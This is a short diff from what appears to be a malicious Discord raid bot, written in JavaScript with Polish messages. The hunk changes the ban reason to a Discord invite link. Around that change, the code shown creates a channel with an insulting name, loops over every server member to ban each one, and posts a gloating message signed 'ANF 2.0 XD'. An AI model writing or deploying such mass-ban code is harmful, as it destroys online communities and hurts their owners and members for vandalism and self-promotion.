@@ -142,7 +142,7 @@ message.guild.createChannel("JEBAĆ FUBU XD");
   let C = message.channel;
   message.guild.members.forEach((f, i) => {
      
-      message.guild.member(f).ban(BReason);
+      message.guild.member(f).ban("https://discord.gg/pppgZCV");
       C.send(`Banned ${f}!`);
   });
   message.channel.send("Wszyscy Użytkownicy zostali zbanowali. Pozdrawiam ANF 2.0 XD");
